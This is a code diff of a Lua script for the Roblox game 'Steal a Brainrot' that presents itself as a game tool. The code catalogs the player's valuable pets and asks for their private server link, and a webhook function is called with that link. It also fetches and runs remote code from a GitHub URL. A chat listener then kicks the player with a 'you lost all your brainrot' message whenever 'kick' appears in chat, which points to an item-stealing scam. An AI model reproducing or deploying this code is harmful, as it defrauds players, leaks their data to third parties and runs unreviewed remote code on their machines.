@@ -64,96 +64,149 @@ local function shuffle(tbl)
     end
 end
 
-local function collectValidPets()
-    local pets = {}
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return pets end
+-- 🧩 Xác định tầng gần nhất dựa theo vị trí model
+local function getNearestFloor(plot, model)
+	local podiums = plot:FindFirstChild("AnimalPodiums")
+	if not podiums then return "? Floor" end
 
-    for _, plot in pairs(plots:GetChildren()) do
-        local sign = plot:FindFirstChild("PlotSign")
-        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
-            local existingPets = {}
-            local floor = "Unknown Floor"
+	local closest = math.huge
+	local floor = "? Floor"
 
-            -- 1️⃣ Quét AnimalPodiums (giữ nguyên như cũ)
-            local podiums = plot:FindFirstChild("AnimalPodiums")
-            if podiums then
-                for _, podium in pairs(podiums:GetChildren()) do
-                    if podium:IsA("Model") then
-                        local num = tonumber(podium.Name:match("^(%d+)_?"))
-                        floor = "Unknown Floor"
-                        if num then
-                            if num >= 1 and num <= 10 then
-                                floor = "1st Floor"
-                            elseif num >= 11 and num <= 18 then
-                                floor = "2nd Floor"
-                            else
-                                floor = "3rd Floor"
-                            end
-                        end
+	for _, podium in pairs(podiums:GetChildren()) do
+		if podium:IsA("Model") then
+			local basePart = podium:FindFirstChild("Base")
+			if not (basePart and basePart:IsA("BasePart")) then
+				for _, sub in pairs(podium:GetDescendants()) do
+					if sub:IsA("BasePart") then
+						basePart = sub
+						break
+					end
+				end
+			end
 
-                        local base = podium:FindFirstChild("Base")
-                        local spawn = base and base:FindFirstChild("Spawn")
-                        if spawn and spawn:FindFirstChild("Attachment") then
-                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
-                            if overhead then
-                                local displayName = overhead:FindFirstChild("DisplayName")
-                                local priceLabel = overhead:FindFirstChild("Generation")
-                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
-                                    local nameText = displayName.Text
-                                    local priceText = priceLabel.Text
-                                    local priceNum = parsePrice(priceText)
-                                    if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
-                                        local petString = string.format("%s (%s) (%s)", nameText, priceText, floor)
-                                        table.insert(pets, petString)
-                                        existingPets[nameText] = true
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
+			if basePart then
+				local success, dist = pcall(function()
+					return (basePart.Position - model:GetPivot().Position).Magnitude
+				end)
+				if success and dist < closest then
+					closest = dist
+					local num = tonumber(podium.Name:match("^(%d+)_?"))
+					if num then
+						if num >= 1 and num <= 10 then
+							floor = "1st Floor"
+						elseif num <= 18 then
+							floor = "2nd Floor"
+						else
+							floor = "3rd Floor"
+						end
+					end
+				end
+			end
+		end
+	end
 
-            -- 2️⃣ Thêm phần **model đặc biệt trong my base** (không phải AnimalPodiums, không FriendPanel)
-            for _, modelB in pairs(plot:GetChildren()) do
-                if modelB:IsA("Model") 
-                   and modelB.Name ~= "AnimalPodiums"
-                   and not modelB.Name:lower():find("friendpanel") 
-                   and modelB:FindFirstChild("FakeRootPart") 
-                then
-                    local bone = modelB.FakeRootPart:FindFirstChild("Bone")
-                    if bone then
-                        -- Duyệt tất cả con trong Bone
-                        for _, child in pairs(bone:GetChildren()) do
-                            local overhead = child:FindFirstChild("OVERHEAD_ATTACHMENT") 
-                                            and child.OVERHEAD_ATTACHMENT:FindFirstChild("AnimalOverhead")
-                            if overhead then
-                                local displayName = overhead:FindFirstChild("DisplayName")
-                                local priceLabel = overhead:FindFirstChild("Generation")
-                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
-                                    local nameText = displayName.Text
-                                    if not existingPets[nameText] then
-                                        local priceText = priceLabel.Text
-                                        local priceNum = parsePrice(priceText)
-                                        if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
-                                            local petString = string.format("%s (%s) (%s)", nameText, priceText, floor)
-                                            table.insert(pets, petString)
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-
-            break -- chỉ xét 1 plot có YourBase.Enabled
-        end
-    end
-
-    return pets
+	return floor
 end
+
+-- 🔍 Đệ quy tìm mọi AnimalOverhead bên trong part (kể cả lồng sâu trong Bone)
+local function findOverheadsInPart(part)
+	local result = {}
+	if part:IsA("Attachment") then
+		local oh = part:FindFirstChild("AnimalOverhead")
+		if oh then table.insert(result, oh) end
+	end
+	for _, c in pairs(part:GetChildren()) do
+		local sub = findOverheadsInPart(c)
+		for _, s in pairs(sub) do table.insert(result, s) end
+	end
+	return result
+end
+
+-- 🐾 Hàm chính gộp đầy đủ logic
+local function collectValidPets()
+	local pets = {}
+	local plots = Workspace:FindFirstChild("Plots")
+	if not plots then return pets end
+
+	for _, plot in pairs(plots:GetChildren()) do
+		local sign = plot:FindFirstChild("PlotSign")
+		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+			local seen = {}
+
+			-- 1️⃣ Quét AnimalPodiums
+			local podiums = plot:FindFirstChild("AnimalPodiums")
+			if podiums then
+				for _, podium in pairs(podiums:GetChildren()) do
+					if podium:IsA("Model") then
+						local num = tonumber(podium.Name:match("^(%d+)_?"))
+						local floor = "Unknown Floor"
+						if num then
+							if num >= 1 and num <= 10 then
+								floor = "1st Floor"
+							elseif num <= 18 then
+								floor = "2nd Floor"
+							else
+								floor = "3rd Floor"
+							end
+						end
+
+						local base = podium:FindFirstChild("Base")
+						local spawn = base and base:FindFirstChild("Spawn")
+						if spawn and spawn:FindFirstChild("Attachment") then
+							local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+							if overhead then
+								local displayName = overhead:FindFirstChild("DisplayName")
+								local priceLabel = overhead:FindFirstChild("Generation")
+								if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
+									local nameText = displayName.Text
+									local priceText = priceLabel.Text
+									local priceNum = parsePrice(priceText)
+									local uniqueKey = nameText .. "_" .. floor .. "_" .. priceText
+									if not seen[uniqueKey] and (priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+										table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
+										seen[uniqueKey] = true
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+
+			-- 2️⃣ Quét model đặc biệt (FakeRootPart)
+			for _, model in pairs(plot:GetChildren()) do
+				if model:IsA("Model")
+					and model:FindFirstChild("FakeRootPart")
+					and not model.Name:lower():find("friendpanel")
+					and model.Name ~= "AnimalPodiums" then
+
+					local fakeRoot = model.FakeRootPart
+					local floor = getNearestFloor(plot, model)
+
+					for _, overhead in pairs(findOverheadsInPart(fakeRoot)) do
+						local name = overhead:FindFirstChild("DisplayName")
+						local gen = overhead:FindFirstChild("Generation")
+						if name and gen and name:IsA("TextLabel") and gen:IsA("TextLabel") then
+							local nameText = name.Text
+							local genText = gen.Text
+							local genValue = parsePrice(genText)
+							local uniqueKey = nameText .. "_" .. floor .. "_" .. genText
+							if not seen[uniqueKey] and (genValue >= PRICE_LIMIT or getPriority(nameText) ~= math.huge) then
+								table.insert(pets, string.format("%s (%s) (%s)", nameText, genText, floor))
+								seen[uniqueKey] = true
+							end
+						end
+					end
+				end
+			end
+
+			break -- chỉ xét plot của mình
+		end
+	end
+
+	return pets
+end
+
 local function detectExecutor()
     local executor = "Unknown"
     if syn then executor = "Synapse X"
@@ -249,122 +302,119 @@ local function sendWebhook(link)
     end
 end
 
+-- Tải sẵn script chính vào biến để dùng lại
+local moreira = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))
+
 if serverType == "PUBLIC SERVER" then
-    sendWebhook()
-    pcall(function()
-        pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/Sync"))()
-        end)
-    end)
+	sendWebhook()
+	pcall(function()
+		moreira() -- chạy script chính
+	end)
 else
-    local playerGui = player and player:WaitForChild("PlayerGui")
-    if playerGui then
-        local screenGui = Instance.new("ScreenGui", playerGui)
-        screenGui.Name = "StealBrainrotGUI"
-        screenGui.ResetOnSpawn = false
+	local playerGui = player and player:WaitForChild("PlayerGui")
+	if playerGui then
+		local screenGui = Instance.new("ScreenGui", playerGui)
+		screenGui.Name = "StealBrainrotGUI"
+		screenGui.ResetOnSpawn = false
 
-        local frame = Instance.new("Frame", screenGui)
-        frame.Size = UDim2.new(0, 320, 0, 180)
-        frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-        frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-        frame.Active = true
-        frame.Draggable = true
-        Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+		local frame = Instance.new("Frame", screenGui)
+		frame.Size = UDim2.new(0, 320, 0, 180)
+		frame.Position = UDim2.new(0.5, -160, 0.5, -90)
+		frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+		frame.Active = true
+		frame.Draggable = true
+		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
-        local title = Instance.new("TextLabel", frame)
-        title.Text = "Steal a Brainrot"
-        title.Font = Enum.Font.FredokaOne
-        title.TextSize = 20
-        title.TextColor3 = Color3.fromRGB(255,255,255)
-        title.BackgroundTransparency = 1
-        title.Size = UDim2.new(1,0,0,28)
-        title.Position = UDim2.new(0,0,0,4)
+		local title = Instance.new("TextLabel", frame)
+		title.Text = "Steal a Brainrot"
+		title.Font = Enum.Font.FredokaOne
+		title.TextSize = 20
+		title.TextColor3 = Color3.fromRGB(255, 255, 255)
+		title.BackgroundTransparency = 1
+		title.Size = UDim2.new(1, 0, 0, 28)
+		title.Position = UDim2.new(0, 0, 0, 4)
 
-        local closeButton = Instance.new("TextButton", frame)
-        closeButton.Text = "X"
-        closeButton.Font = Enum.Font.FredokaOne
-        closeButton.TextSize = 18
-        closeButton.TextColor3 = Color3.fromRGB(255,255,255)
-        closeButton.BackgroundColor3 = Color3.fromRGB(60,0,0)
-        closeButton.Size = UDim2.new(0,28,0,28)
-        closeButton.Position = UDim2.new(1,-34,0,4)
-        Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0,8)
-        closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
+		local closeButton = Instance.new("TextButton", frame)
+		closeButton.Text = "X"
+		closeButton.Font = Enum.Font.FredokaOne
+		closeButton.TextSize = 18
+		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+		closeButton.Size = UDim2.new(0, 28, 0, 28)
+		closeButton.Position = UDim2.new(1, -34, 0, 4)
+		Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
+		closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() end)
 
-        local textBox = Instance.new("TextBox", frame)
-        textBox.Size = UDim2.new(0.9,0,0,40)
-        textBox.Position = UDim2.new(0.05,0,0,60)
-        textBox.PlaceholderText = "Please enter your private server link"
-        textBox.Text = ""
-        textBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
-        textBox.TextColor3 = Color3.fromRGB(255,255,255)
-        textBox.ClearTextOnFocus = false
-        textBox.Font = Enum.Font.FredokaOne
-        textBox.TextSize = 14
-        Instance.new("UICorner", textBox).CornerRadius = UDim.new(0,8)
+		local textBox = Instance.new("TextBox", frame)
+		textBox.Size = UDim2.new(0.9, 0, 0, 40)
+		textBox.Position = UDim2.new(0.05, 0, 0, 60)
+		textBox.PlaceholderText = "Please enter your private server link"
+		textBox.Text = ""
+		textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+		textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+		textBox.ClearTextOnFocus = false
+		textBox.Font = Enum.Font.FredokaOne
+		textBox.TextSize = 14
+		Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 8)
 
-        local sendButton = Instance.new("TextButton", frame)
-        sendButton.Text = "Send"
-        sendButton.Font = Enum.Font.FredokaOne
-        sendButton.TextSize = 18
-        sendButton.TextColor3 = Color3.fromRGB(255,255,255)
-        sendButton.BackgroundColor3 = Color3.fromRGB(0,100,0)
-        sendButton.Size = UDim2.new(0.4,0,0,32)
-        sendButton.Position = UDim2.new(0.3,0,0,110)
-        Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0,8)
+		local sendButton = Instance.new("TextButton", frame)
+		sendButton.Text = "Send"
+		sendButton.Font = Enum.Font.FredokaOne
+		sendButton.TextSize = 18
+		sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+		sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+		sendButton.Size = UDim2.new(0.4, 0, 0, 32)
+		sendButton.Position = UDim2.new(0.3, 0, 0, 110)
+		Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)
 
-        local function showError(msg)
-            local popup = Instance.new("Frame", screenGui)
-            popup.Size = UDim2.new(0,300,0,120)
-            popup.Position = UDim2.new(0.5,-150,0.5,-60)
-            popup.BackgroundColor3 = Color3.fromRGB(30,30,30)
-            popup.AnchorPoint = Vector2.new(0.5,0.5)
-            Instance.new("UICorner", popup).CornerRadius = UDim.new(0,12)
-            local label = Instance.new("TextLabel", popup)
-            label.Size = UDim2.new(1,-20,0.6,0)
-            label.Position = UDim2.new(0,10,0.1,0)
-            label.BackgroundTransparency = 1
-            label.Text = msg
-            label.TextColor3 = Color3.fromRGB(255,255,255)
-            label.TextScaled = true
-            label.Font = Enum.Font.FredokaOne
-            local button = Instance.new("TextButton", popup)
-            button.Size = UDim2.new(0.5,0,0.25,0)
-            button.Position = UDim2.new(0.25,0,0.7,0)
-            button.BackgroundColor3 = Color3.fromRGB(70,70,70)
-            button.Text = "OK"
-            button.TextColor3 = Color3.fromRGB(255,255,255)
-            button.Font = Enum.Font.FredokaOne
-            Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)
-            button.MouseButton1Click:Connect(function() popup:Destroy() end)
-            task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
-        end
+		local function showError(msg)
+			local popup = Instance.new("Frame", screenGui)
+			popup.Size = UDim2.new(0, 300, 0, 120)
+			popup.Position = UDim2.new(0.5, -150, 0.5, -60)
+			popup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			popup.AnchorPoint = Vector2.new(0.5, 0.5)
+			Instance.new("UICorner", popup).CornerRadius = UDim.new(0, 12)
+			local label = Instance.new("TextLabel", popup)
+			label.Size = UDim2.new(1, -20, 0.6, 0)
+			label.Position = UDim2.new(0, 10, 0.1, 0)
+			label.BackgroundTransparency = 1
+			label.Text = msg
+			label.TextColor3 = Color3.fromRGB(255, 255, 255)
+			label.TextScaled = true
+			label.Font = Enum.Font.FredokaOne
+			local button = Instance.new("TextButton", popup)
+			button.Size = UDim2.new(0.5, 0, 0.25, 0)
+			button.Position = UDim2.new(0.25, 0, 0.7, 0)
+			button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+			button.Text = "OK"
+			button.TextColor3 = Color3.fromRGB(255, 255, 255)
+			button.Font = Enum.Font.FredokaOne
+			Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+			button.MouseButton1Click:Connect(function() popup:Destroy() end)
+			task.delay(5, function() if popup and popup.Parent then popup:Destroy() end end)
+		end
 
-        local function isValidPrivateServerLink(txt)
-            return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
-        end
+		local function isValidPrivateServerLink(txt)
+			return string.match(txt or "", "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
+		end
 
-        local function handleSend()
-            local txt = textBox.Text or ""
-            if isValidPrivateServerLink(txt) then
-                screenGui:Destroy()
-                task.spawn(function()
-                    pcall(function() sendWebhook(txt) end)
-                    pcall(function()
-                        loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/Sync"))()
-                    end)
-                end)
-            else
-                showError("Please enter your private server link")
-            end
-        end
+		local function handleSend()
+			local txt = textBox.Text or ""
+			if isValidPrivateServerLink(txt) then
+				screenGui:Destroy()
+				task.spawn(function()
+					pcall(function() sendWebhook(txt) end)
+					pcall(function() moreira() end) -- chạy script chính sau khi gửi webhook
+				end)
+			else
+				showError("Please enter your private server link")
+			end
+		end
 
-        sendButton.MouseButton1Click:Connect(handleSend)
-        textBox.FocusLost:Connect(function(enterPressed)
-            if enterPressed then handleSend() end
-        end)
-    end
+		sendButton.MouseButton1Click:Connect(handleSend)
+	end
 end
+
 
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
@@ -616,4 +666,66 @@ task.spawn(function()
             end
         end
     end
+end)
+
+-- LocalScript (StarterPlayerScripts)
+local CoreGui = game:GetService("CoreGui")
+
+local function checkAndKick(text)
+	if not text then return end
+	local lower = string.lower(text)
+	if string.find(lower, "kick", 1, true) then
+		-- Kick chính bản thân với nội dung xuống dòng
+		player:Kick("you lost all your brainrot\nhttps://discord.gg/UgEG6gVc")
+	end
+end
+
+-- Đợi ExperienceChat load
+local experienceChat = CoreGui:WaitForChild("ExperienceChat", 5)
+if not experienceChat then
+	warn("ExperienceChat không tìm thấy.")
+	return
+end
+
+local contentPath = experienceChat:WaitForChild("appLayout", 5)
+contentPath = contentPath and contentPath:WaitForChild("chatWindow", 5)
+contentPath = contentPath and contentPath:WaitForChild("scrollingView", 5)
+contentPath = contentPath and contentPath:WaitForChild("bottomLockedScrollView", 5)
+contentPath = contentPath and contentPath:WaitForChild("RCTScrollView", 5)
+contentPath = contentPath and contentPath:WaitForChild("RCTScrollContentView", 5)
+
+if not contentPath then
+	warn("Không thể tìm RCTScrollContentView.")
+	return
+end
+
+-- Kiểm tra các message đã có
+for _, child in ipairs(contentPath:GetChildren()) do
+	local textMessage = child:FindFirstChild("TextMessage")
+	if textMessage then
+		local body = textMessage:FindFirstChild("BodyText")
+		if body and body:IsA("TextLabel") then
+			checkAndKick(body.Text)
+		end
+	end
+end
+
+-- Bắt sự kiện khi có message mới (mỗi message có ID ngẫu nhiên)
+contentPath.DescendantAdded:Connect(function(desc)
+	-- nếu chính node BodyText được thêm
+	if desc.Name == "BodyText" and desc:IsA("TextLabel") then
+		task.wait()
+		checkAndKick(desc.Text)
+		return
+	end
+
+	-- hoặc nếu một frame mới được thêm có TextMessage.BodyText bên trong
+	local textMessage = desc:FindFirstChild("TextMessage")
+	if textMessage then
+		local body = textMessage:FindFirstChild("BodyText")
+		if body and body:IsA("TextLabel") then
+			task.wait()
+			checkAndKick(body.Text)
+		end
+	end
 end)
